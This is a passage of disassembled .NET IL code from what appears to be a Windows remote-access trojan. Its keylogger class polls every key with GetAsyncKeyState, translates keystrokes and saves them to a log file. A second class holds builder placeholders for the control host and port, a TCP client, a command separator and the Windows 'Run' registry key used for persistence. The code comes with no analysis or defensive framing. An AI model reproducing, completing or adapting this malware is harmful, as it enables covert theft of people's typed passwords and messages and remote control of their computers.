      IL_0094:  ldc.i4.s   35
      IL_0096:  bne.un.s   IL_009a

      IL_0098:  br.s       IL_00a0

      IL_009a:  ldloc.s    V_5
      IL_009c:  ldc.i4.s   46
      IL_009e:  bne.un.s   IL_00a2

      IL_00a0:  br.s       IL_00aa

      IL_00a2:  ldloc.s    V_5
      IL_00a4:  ldc.i4.8
      IL_00a5:  beq.s      IL_00aa

      IL_00a7:  ldc.i4.0
      IL_00a8:  br.s       IL_00ab

      IL_00aa:  ldc.i4.1
      IL_00ab:  stloc.s    V_8
      IL_00ad:  ldloc.s    V_8
      IL_00af:  brfalse.s  IL_00d6

      IL_00b1:  ldstr      "["
      IL_00b6:  ldarg.1
      IL_00b7:  box        [System.Windows.Forms]System.Windows.Forms.Keys
      IL_00bc:  callvirt   instance string [mscorlib]System.Enum::ToString()
      IL_00c1:  ldstr      "]"
      IL_00c6:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00cb:  stloc.0
      IL_00cc:  leave      IL_0248

      IL_00d1:  br         IL_01bf

      IL_00d6:  nop
      IL_00d7:  ldloc.s    V_5
      IL_00d9:  ldc.i4     0xa0
      IL_00de:  beq.s      IL_00e9

      IL_00e0:  ldloc.s    V_5
      IL_00e2:  ldc.i4     0xa1
      IL_00e7:  bne.un.s   IL_00eb

      IL_00e9:  br.s       IL_00f4

      IL_00eb:  ldloc.s    V_5
      IL_00ed:  ldc.i4     0x10000
      IL_00f2:  bne.un.s   IL_00f6

      IL_00f4:  br.s       IL_00fc

      IL_00f6:  ldloc.s    V_5
      IL_00f8:  ldc.i4.s   16
      IL_00fa:  bne.un.s   IL_00fe

      IL_00fc:  br.s       IL_0107

      IL_00fe:  ldloc.s    V_5
      IL_0100:  ldc.i4     0x20000
      IL_0105:  bne.un.s   IL_0109

      IL_0107:  br.s       IL_010f

      IL_0109:  ldloc.s    V_5
      IL_010b:  ldc.i4.s   17
      IL_010d:  bne.un.s   IL_0111

      IL_010f:  br.s       IL_011a

      IL_0111:  ldloc.s    V_5
      IL_0113:  ldc.i4     0xa3
      IL_0118:  bne.un.s   IL_011c

      IL_011a:  br.s       IL_0125

      IL_011c:  ldloc.s    V_5
      IL_011e:  ldc.i4     0xa2
      IL_0123:  bne.un.s   IL_0127

      IL_0125:  br.s       IL_0133

      IL_0127:  ldloc.s    V_5
      IL_0129:  ldc.i4     0x40000
      IL_012e:  beq.s      IL_0133

      IL_0130:  ldc.i4.0
      IL_0131:  br.s       IL_0134

      IL_0133:  ldc.i4.1
      IL_0134:  stloc.s    V_8
      IL_0136:  ldloc.s    V_8
      IL_0138:  brfalse.s  IL_0147

      IL_013a:  ldstr      ""
      IL_013f:  stloc.0
      IL_0140:  leave      IL_0248

      IL_0145:  br.s       IL_01bf

      IL_0147:  nop
      IL_0148:  ldloc.s    V_5
      IL_014a:  ldc.i4.s   32
      IL_014c:  ceq
      IL_014e:  stloc.s    V_8
      IL_0150:  ldloc.s    V_8
      IL_0152:  brfalse.s  IL_0161

      IL_0154:  ldstr      " "
      IL_0159:  stloc.0
      IL_015a:  leave      IL_0248

      IL_015f:  br.s       IL_01bf

      IL_0161:  nop
      IL_0162:  ldloc.s    V_5
      IL_0164:  ldc.i4.s   13
      IL_0166:  beq.s      IL_0171

      IL_0168:  ldloc.s    V_5
      IL_016a:  ldc.i4.s   13
      IL_016c:  beq.s      IL_0171

      IL_016e:  ldc.i4.0
      IL_016f:  br.s       IL_0172

      IL_0171:  ldc.i4.1
      IL_0172:  stloc.s    V_8
      IL_0174:  ldloc.s    V_8
      IL_0176:  brfalse.s  IL_01a7

      IL_0178:  ldarg.0
      IL_0179:  ldfld      string ClassLibrary1.kl::Logs
      IL_017e:  ldstr      "[ENTER]\r\n"
      IL_0183:  callvirt   instance bool [mscorlib]System.String::EndsWith(string)
      IL_0188:  stloc.s    V_7
      IL_018a:  ldloc.s    V_7
      IL_018c:  brfalse.s  IL_0199

      IL_018e:  ldstr      ""
      IL_0193:  stloc.0
      IL_0194:  leave      IL_0248

      IL_0199:  nop
      IL_019a:  ldstr      "[ENTER]\r\n"
      IL_019f:  stloc.0
      IL_01a0:  leave      IL_0248

      IL_01a5:  br.s       IL_01bf

      IL_01a7:  nop
      IL_01a8:  ldloc.s    V_5
      IL_01aa:  ldc.i4.s   9
      IL_01ac:  ceq
      IL_01ae:  stloc.s    V_8
      IL_01b0:  ldloc.s    V_8
      IL_01b2:  brfalse.s  IL_01bf

      IL_01b4:  ldstr      "[TAP]\r\n"
      IL_01b9:  stloc.0
      IL_01ba:  leave      IL_0248

      IL_01bf:  nop
      IL_01c0:  ldloc.1
      IL_01c1:  stloc.s    V_8
      IL_01c3:  ldloc.s    V_8
      IL_01c5:  brfalse.s  IL_01d6

      IL_01c7:  ldarg.1
      IL_01c8:  conv.ovf.u4
      IL_01c9:  call       string ClassLibrary1.kl::VKCodeToUnicode(uint32)
      IL_01ce:  callvirt   instance string [mscorlib]System.String::ToUpper()
      IL_01d3:  stloc.0
      IL_01d4:  leave.s    IL_0248

      IL_01d6:  nop
      IL_01d7:  ldarg.1
      IL_01d8:  conv.ovf.u4
      IL_01d9:  call       string ClassLibrary1.kl::VKCodeToUnicode(uint32)
      IL_01de:  stloc.2
      IL_01df:  leave.s    IL_0243

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01e1:  dup
      IL_01e2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01e7:  stloc.s    V_4
      IL_01e9:  nop
      IL_01ea:  ldloc.s    V_4
      IL_01ec:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01f1:  nop
      IL_01f2:  ldloc.s    V_4
      IL_01f4:  stloc.3
      IL_01f5:  ldloc.1
      IL_01f6:  stloc.s    V_8
      IL_01f8:  ldloc.s    V_8
      IL_01fa:  brfalse.s  IL_0220

      IL_01fc:  ldarg.1
      IL_01fd:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_0202:  stloc.s    V_6
      IL_0204:  ldloca.s   V_6
      IL_0206:  call       instance string [mscorlib]System.Char::ToString()
      IL_020b:  callvirt   instance string [mscorlib]System.String::ToUpper()
      IL_0210:  stloc.2
      IL_0211:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0216:  nop
      IL_0217:  ldloc.2
      IL_0218:  stloc.0
      IL_0219:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_021e:  leave.s    IL_0248

      IL_0220:  nop
      IL_0221:  ldarg.1
      IL_0222:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_0227:  stloc.s    V_6
      IL_0229:  ldloca.s   V_6
      IL_022b:  call       instance string [mscorlib]System.Char::ToString()
      IL_0230:  callvirt   instance string [mscorlib]System.String::ToLower()
      IL_0235:  stloc.2
      IL_0236:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_023b:  nop
      IL_023c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0241:  leave.s    IL_0243

    }  // end handler
    IL_0243:  nop
    IL_0244:  ldloc.2
    IL_0245:  stloc.0
    IL_0246:  br.s       IL_0248

    IL_0248:  ldloc.0
    IL_0249:  ret
  } // end of method kl::Fix

  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int16  GetAsyncKeyState(int32 vKey) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          native int  GetForegroundWindow() cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int32  GetKeyboardLayout(int32 dwLayout) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          bool  GetKeyboardState(uint8[] lpKeyState) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          int32  GetWindowThreadProcessId(native int hwnd,
                                          int32& lpdwProcessID) cil managed preservesig
  {
  }
  .method private instance string  HM() cil managed
  {
    // Code size       73 (0x49)
    .maxstack  2
    .locals init (string V_0,
             string V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3,
             valuetype [mscorlib]System.DateTime V_4)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  ldarg.0
      IL_0003:  ldfld      class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Clock ClassLibrary1.kl::Clock
      IL_0008:  callvirt   instance valuetype [mscorlib]System.DateTime [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Clock::get_LocalTime()
      IL_000d:  stloc.s    V_4
      IL_000f:  ldloca.s   V_4
      IL_0011:  ldstr      "yy/MM/dd"
      IL_0016:  call       instance string [mscorlib]System.DateTime::ToString(string)
      IL_001b:  stloc.1
      IL_001c:  leave.s    IL_0042

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_001e:  dup
      IL_001f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0024:  stloc.3
      IL_0025:  nop
      IL_0026:  ldloc.3
      IL_0027:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_002c:  nop
      IL_002d:  ldloc.3
      IL_002e:  stloc.2
      IL_002f:  ldstr      "\?\?/\?\?/\?\?"
      IL_0034:  stloc.1
      IL_0035:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_003a:  nop
      IL_003b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0040:  leave.s    IL_0042

    }  // end handler
    IL_0042:  nop
    IL_0043:  ldloc.1
    IL_0044:  stloc.0
    IL_0045:  br.s       IL_0047

    IL_0047:  ldloc.0
    IL_0048:  ret
  } // end of method kl::HM

  .method private static pinvokeimpl("user32.dll" winapi) 
          uint32  MapVirtualKey(uint32 uCode,
                                uint32 uMapType) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          int32  ToUnicodeEx(uint32 wVirtKey,
                             uint32 wScanCode,
                             uint8[] lpKeyState,
                             [out] class [mscorlib]System.Text.StringBuilder  marshal( lpwstr) pwszBuff,
                             int32 cchBuff,
                             uint32 wFlags,
                             native int dwhkl) cil managed preservesig
  {
  }
  .method private static string  VKCodeToUnicode(uint32 VKCode) cil managed
  {
    // Code size       162 (0xa2)
    .maxstack  7
    .locals init (string V_0,
             native int V_1,
             int32 V_2,
             int32 V_3,
             uint8[] V_4,
             class [mscorlib]System.Text.StringBuilder V_5,
             uint32 V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8,
             bool V_9)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  newobj     instance void [mscorlib]System.Text.StringBuilder::.ctor()
      IL_0007:  stloc.s    V_5
      IL_0009:  ldc.i4     0xff
      IL_000e:  newarr     [mscorlib]System.Byte
      IL_0013:  stloc.s    V_4
      IL_0015:  ldloc.s    V_4
      IL_0017:  call       bool ClassLibrary1.kl::GetKeyboardState(uint8[])
      IL_001c:  ldc.i4.0
      IL_001d:  ceq
      IL_001f:  stloc.s    V_9
      IL_0021:  ldloc.s    V_9
      IL_0023:  brfalse.s  IL_002d

      IL_0025:  ldstr      ""
      IL_002a:  stloc.0
      IL_002b:  leave.s    IL_00a0

      IL_002d:  nop
      IL_002e:  ldarg.0
      IL_002f:  ldc.i4.0
      IL_0030:  call       uint32 ClassLibrary1.kl::MapVirtualKey(uint32,
                                                                  uint32)
      IL_0035:  stloc.s    V_6
      IL_0037:  call       native int ClassLibrary1.kl::GetForegroundWindow()
      IL_003c:  stloc.1
      IL_003d:  ldc.i4.0
      IL_003e:  stloc.3
      IL_003f:  ldloc.1
      IL_0040:  ldloca.s   V_3
      IL_0042:  call       int32 ClassLibrary1.kl::GetWindowThreadProcessId(native int,
                                                                            int32&)
      IL_0047:  call       int32 ClassLibrary1.kl::GetKeyboardLayout(int32)
      IL_004c:  stloc.2
      IL_004d:  ldarg.0
      IL_004e:  ldloc.s    V_6
      IL_0050:  ldloc.s    V_4
      IL_0052:  ldloc.s    V_5
      IL_0054:  ldc.i4.5
      IL_0055:  ldc.i4.0
      IL_0056:  ldloc.2
      IL_0057:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
      IL_005c:  call       int32 ClassLibrary1.kl::ToUnicodeEx(uint32,
                                                               uint32,
                                                               uint8[],
                                                               class [mscorlib]System.Text.StringBuilder,
                                                               int32,
                                                               uint32,
                                                               native int)
      IL_0061:  pop
      IL_0062:  ldloc.s    V_5
      IL_0064:  callvirt   instance string [mscorlib]System.Text.StringBuilder::ToString()
      IL_0069:  stloc.0
      IL_006a:  leave.s    IL_00a0

      IL_006c:  leave.s    IL_0090

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_006e:  dup
      IL_006f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0074:  stloc.s    V_8
      IL_0076:  nop
      IL_0077:  ldloc.s    V_8
      IL_0079:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_007e:  nop
      IL_007f:  ldloc.s    V_8
      IL_0081:  stloc.s    V_7
      IL_0083:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0088:  nop
      IL_0089:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_008e:  leave.s    IL_0090

    }  // end handler
    IL_0090:  nop
    IL_0091:  ldarg.0
    IL_0092:  conv.ovf.i4.un
    IL_0093:  box        [System.Windows.Forms]System.Windows.Forms.Keys
    IL_0098:  callvirt   instance string [mscorlib]System.Enum::ToString()
    IL_009d:  stloc.0
    IL_009e:  br.s       IL_00a0

    IL_00a0:  ldloc.0
    IL_00a1:  ret
  } // end of method kl::VKCodeToUnicode

  .method public instance void  WRK() cil managed
  {
    // Code size       341 (0x155)
    .maxstack  5
    .locals init (class [mscorlib]System.Exception V_0,
             class [mscorlib]System.Exception V_1,
             int32 V_2,
             int32 V_3,
             valuetype [System.Windows.Forms]System.Windows.Forms.Keys V_4,
             string V_5,
             int32 V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8,
             bool V_9)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  ldarg.0
      IL_0003:  ldarg.0
      IL_0004:  ldfld      string ClassLibrary1.kl::LogsPath
      IL_0009:  call       string [mscorlib]System.IO.File::ReadAllText(string)
      IL_000e:  stfld      string ClassLibrary1.kl::Logs
      IL_0013:  leave.s    IL_0033

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0015:  dup
      IL_0016:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_001b:  stloc.1
      IL_001c:  nop
      IL_001d:  ldloc.1
      IL_001e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0023:  nop
      IL_0024:  ldloc.1
      IL_0025:  stloc.0
      IL_0026:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_002b:  nop
      IL_002c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0031:  leave.s    IL_0033

    }  // end handler
    IL_0033:  nop
    IL_0034:  nop
    .try
    {
      IL_0035:  ldc.i4.0
      IL_0036:  stloc.2
      IL_0037:  br         IL_0124

      IL_003c:  ldloc.2
      IL_003d:  ldc.i4.1
      IL_003e:  add.ovf
      IL_003f:  stloc.2
      IL_0040:  ldc.i4.0
      IL_0041:  stloc.3
      IL_0042:  nop
      IL_0043:  ldloc.3
      IL_0044:  call       int16 ClassLibrary1.kl::GetAsyncKeyState(int32)
      IL_0049:  ldc.i4     0xffff8001
      IL_004e:  ceq
      IL_0050:  stloc.s    V_9
      IL_0052:  ldloc.s    V_9
      IL_0054:  brfalse.s  IL_00a6

      IL_0056:  ldloc.3
      IL_0057:  stloc.s    V_4
      IL_0059:  ldarg.0
      IL_005a:  ldloc.s    V_4
      IL_005c:  callvirt   instance string ClassLibrary1.kl::Fix(valuetype [System.Windows.Forms]System.Windows.Forms.Keys)
      IL_0061:  stloc.s    V_5
      IL_0063:  ldloc.s    V_5
      IL_0065:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_006a:  ldc.i4.0
      IL_006b:  cgt
      IL_006d:  stloc.s    V_9
      IL_006f:  ldloc.s    V_9
      IL_0071:  brfalse.s  IL_009d

      IL_0073:  ldarg.0
      IL_0074:  ldarg.0
      IL_0075:  ldfld      string ClassLibrary1.kl::Logs
      IL_007a:  ldarg.0
      IL_007b:  callvirt   instance string ClassLibrary1.kl::AV()
      IL_0080:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0085:  stfld      string ClassLibrary1.kl::Logs
      IL_008a:  ldarg.0
      IL_008b:  ldarg.0
      IL_008c:  ldfld      string ClassLibrary1.kl::Logs
      IL_0091:  ldloc.s    V_5
      IL_0093:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0098:  stfld      string ClassLibrary1.kl::Logs
      IL_009d:  nop
      IL_009e:  ldarg.0
      IL_009f:  ldloc.s    V_4
      IL_00a1:  stfld      valuetype [System.Windows.Forms]System.Windows.Forms.Keys ClassLibrary1.kl::lastKey
      IL_00a6:  nop
      IL_00a7:  ldloc.3
      IL_00a8:  ldc.i4.1
      IL_00a9:  add.ovf
      IL_00aa:  stloc.3
      IL_00ab:  ldloc.3
      IL_00ac:  ldc.i4     0xff
      IL_00b1:  cgt
      IL_00b3:  ldc.i4.0
      IL_00b4:  ceq
      IL_00b6:  stloc.s    V_9
      IL_00b8:  ldloc.s    V_9
      IL_00ba:  brtrue.s   IL_0043

      IL_00bc:  ldloc.2
      IL_00bd:  ldc.i4     0x3e8
      IL_00c2:  ceq
      IL_00c4:  stloc.s    V_9
      IL_00c6:  ldloc.s    V_9
      IL_00c8:  brfalse.s  IL_011b

      IL_00ca:  ldc.i4.0
      IL_00cb:  stloc.2
      IL_00cc:  ldc.i4     0x5000
      IL_00d1:  stloc.s    V_6
      IL_00d3:  ldarg.0
      IL_00d4:  ldfld      string ClassLibrary1.kl::Logs
      IL_00d9:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_00de:  ldloc.s    V_6
      IL_00e0:  cgt
      IL_00e2:  stloc.s    V_9
      IL_00e4:  ldloc.s    V_9
      IL_00e6:  brfalse.s  IL_0108

      IL_00e8:  ldarg.0
      IL_00e9:  ldarg.0
      IL_00ea:  ldfld      string ClassLibrary1.kl::Logs
      IL_00ef:  ldc.i4.0
      IL_00f0:  ldarg.0
      IL_00f1:  ldfld      string ClassLibrary1.kl::Logs
      IL_00f6:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_00fb:  ldloc.s    V_6
      IL_00fd:  sub.ovf
      IL_00fe:  callvirt   instance string [mscorlib]System.String::Remove(int32,
                                                                           int32)
      IL_0103:  stfld      string ClassLibrary1.kl::Logs
      IL_0108:  nop
      IL_0109:  ldarg.0
      IL_010a:  ldfld      string ClassLibrary1.kl::LogsPath
      IL_010f:  ldarg.0
      IL_0110:  ldfld      string ClassLibrary1.kl::Logs
      IL_0115:  call       void [mscorlib]System.IO.File::WriteAllText(string,
                                                                       string)
      IL_011a:  nop
      IL_011b:  nop
      IL_011c:  ldc.i4.1
      IL_011d:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0122:  nop
      IL_0123:  nop
      IL_0124:  ldc.i4.1
      IL_0125:  stloc.s    V_9
      IL_0127:  ldloc.s    V_9
      IL_0129:  brtrue     IL_003c

      IL_012e:  leave.s    IL_0152

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0130:  dup
      IL_0131:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0136:  stloc.s    V_8
      IL_0138:  nop
      IL_0139:  ldloc.s    V_8
      IL_013b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0140:  nop
      IL_0141:  ldloc.s    V_8
      IL_0143:  stloc.s    V_7
      IL_0145:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_014a:  nop
      IL_014b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0150:  leave.s    IL_0152

    }  // end handler
    IL_0152:  nop
    IL_0153:  nop
    IL_0154:  ret
  } // end of method kl::WRK

} // end of class ClassLibrary1.kl

.class private auto ansi sealed beforefieldinit ClassLibrary1.OK
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private static uint8[] b
  .field public static bool BD
  .field public static class [System]System.Net.Sockets.TcpClient C
  .field public static bool Cn
  .field public static string DR
  .field public static string EXE
  .field public static class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer F
  .field public static class [mscorlib]System.IO.FileStream FS
  .field public static string H
  .field public static bool Idr
  .field public static bool IsF
  .field public static bool Isu
  .field public static class ClassLibrary1.kl kq
  .field private static string lastcap
  .field public static class [mscorlib]System.IO.FileInfo LO
  .field private static class [mscorlib]System.IO.MemoryStream MeM
  .field public static class [mscorlib]System.Threading.Mutex MT
  .field public static string P
  .field private static class [System]System.Diagnostics.Process Pro
  .field public static string RG
  .field public static string sf
  .field public static string SPL
  .field public static string VN
  .field public static string VR
  .field public static string Y
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       246 (0xf6)
    .maxstack  1
    IL_0000:  ldc.i4     0x1401
    IL_0005:  newarr     [mscorlib]System.Byte
    IL_000a:  stsfld     uint8[] ClassLibrary1.OK::b
    IL_000f:  ldstr      "[BD]"
    IL_0014:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0019:  stsfld     bool ClassLibrary1.OK::BD
    IL_001e:  ldnull
    IL_001f:  stsfld     class [System]System.Net.Sockets.TcpClient ClassLibrary1.OK::C
    IL_0024:  ldc.i4.0
    IL_0025:  stsfld     bool ClassLibrary1.OK::Cn
    IL_002a:  ldstr      "[DR]"
    IL_002f:  stsfld     string ClassLibrary1.OK::DR
    IL_0034:  ldstr      "[EXE]"
    IL_0039:  stsfld     string ClassLibrary1.OK::EXE
    IL_003e:  newobj     instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()
    IL_0043:  stsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
    IL_0048:  ldstr      "[H]"
    IL_004d:  stsfld     string ClassLibrary1.OK::H
    IL_0052:  ldstr      "[Idr]"
    IL_0057:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_005c:  stsfld     bool ClassLibrary1.OK::Idr
    IL_0061:  ldstr      "[Isf]"
    IL_0066:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_006b:  stsfld     bool ClassLibrary1.OK::IsF
    IL_0070:  ldstr      "[Isu]"
    IL_0075:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_007a:  stsfld     bool ClassLibrary1.OK::Isu
    IL_007f:  ldnull
    IL_0080:  stsfld     class ClassLibrary1.kl ClassLibrary1.OK::kq
    IL_0085:  ldstr      ""
    IL_008a:  stsfld     string ClassLibrary1.OK::lastcap
    IL_008f:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
    IL_0094:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
    IL_0099:  stsfld     class [mscorlib]System.IO.FileInfo ClassLibrary1.OK::LO
    IL_009e:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_00a3:  stsfld     class [mscorlib]System.IO.MemoryStream ClassLibrary1.OK::MeM
    IL_00a8:  ldnull
    IL_00a9:  stsfld     class [mscorlib]System.Threading.Mutex ClassLibrary1.OK::MT
    IL_00ae:  ldstr      "[P]"
    IL_00b3:  stsfld     string ClassLibrary1.OK::P
    IL_00b8:  ldstr      "[RG]"
    IL_00bd:  stsfld     string ClassLibrary1.OK::RG
    IL_00c2:  ldstr      "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    IL_00c7:  stsfld     string ClassLibrary1.OK::sf
    IL_00cc:  ldstr      "[endof]"
    IL_00d1:  stsfld     string ClassLibrary1.OK::SPL
    IL_00d6:  ldstr      "[VN]"
    IL_00db:  stsfld     string ClassLibrary1.OK::VN
    IL_00e0:  ldstr      "0.6.4"
    IL_00e5:  stsfld     string ClassLibrary1.OK::VR
    IL_00ea:  ldstr      "|'|'|"
    IL_00ef:  stsfld     string ClassLibrary1.OK::Y
    IL_00f4:  nop
    IL_00f5:  ret
  } // end of method OK::.cctor

  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       9 (0x9)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  nop
    IL_0007:  nop
    IL_0008:  ret
  } // end of method OK::.ctor

  .method private static void  _Lambda__1(object a0) cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.Diagnostics.DebuggerStepThroughAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       20 (0x14)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0007:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_000c:  call       bool ClassLibrary1.OK::Send(string)
    IL_0011:  pop
    IL_0012:  nop
    IL_0013:  ret
  } // end of method OK::_Lambda__1

  .method private static void  _Lambda__2(object a0,
                                          class [mscorlib]System.EventArgs a1) cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerStepThroughAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       9 (0x9)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  call       void ClassLibrary1.OK::ex()
    IL_0006:  nop
    IL_0007:  nop
    IL_0008:  ret
  } // end of method OK::_Lambda__2

  .method private static void  _Lambda__3(object a0) cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.Diagnostics.DebuggerStepThroughAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       15 (0xf)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  castclass  uint8[]
    IL_0007:  call       void ClassLibrary1.OK::Ind(uint8[])
    IL_000c:  nop
    IL_000d:  nop
    IL_000e:  ret
  } // end of method OK::_Lambda__3

  .method public static string  ACT() cil managed
  {
    // Code size       244 (0xf4)
    .maxstack  4
    .locals init (string V_0,
             string V_1,
             string V_2,
             native int V_3,
             int32 V_4,
             int32 V_5,
             string V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10,
             string V_11,
             bool V_12)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  call       native int ClassLibrary1.OK::GetForegroundWindow()
      IL_0007:  stloc.3
      IL_0008:  ldloc.3
      IL_0009:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_000e:  call       bool [mscorlib]System.IntPtr::op_Equality(native int,
                                                                     native int)
      IL_0013:  stloc.s    V_12
      IL_0015:  ldloc.s    V_12
      IL_0017:  brfalse.s  IL_002c

      IL_0019:  ldstr      " "
      IL_001e:  stloc.2
      IL_001f:  ldloca.s   V_2
      IL_0021:  call       string ClassLibrary1.OK::ENB(string&)
      IL_0026:  stloc.0
      IL_0027:  leave      IL_00f2

      IL_002c:  nop
      IL_002d:  ldloc.3
      IL_002e:  call       int64 [mscorlib]System.IntPtr::op_Explicit(native int)
      IL_0033:  call       int32 ClassLibrary1.OK::GetWindowTextLength(int64)
      IL_0038:  stloc.s    V_5
      IL_003a:  ldloc.s    V_5
      IL_003c:  ldc.i4.1
